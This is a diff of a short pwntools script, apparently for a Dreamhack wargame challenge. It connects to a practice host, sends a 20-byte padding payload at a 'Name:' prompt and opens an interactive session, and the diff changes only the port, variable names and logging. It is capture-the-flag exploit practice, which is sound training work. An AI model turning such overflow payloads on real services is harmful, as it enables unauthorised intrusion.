@@ -1,10 +1,12 @@
 from pwn import *
-context.log_level = 'debug'
 
-n = remote('host1.dreamhack.games',8398)
+hosts = 'host1.dreamhack.games'
+port = 17757
+
+p = remote(hosts,port)
 
 payload = b'A'*20
 
-n.sendafter('Name:',payload)
+p.sendafter('Name: ',payload)
 
-n.interactive()
+p.interactive()
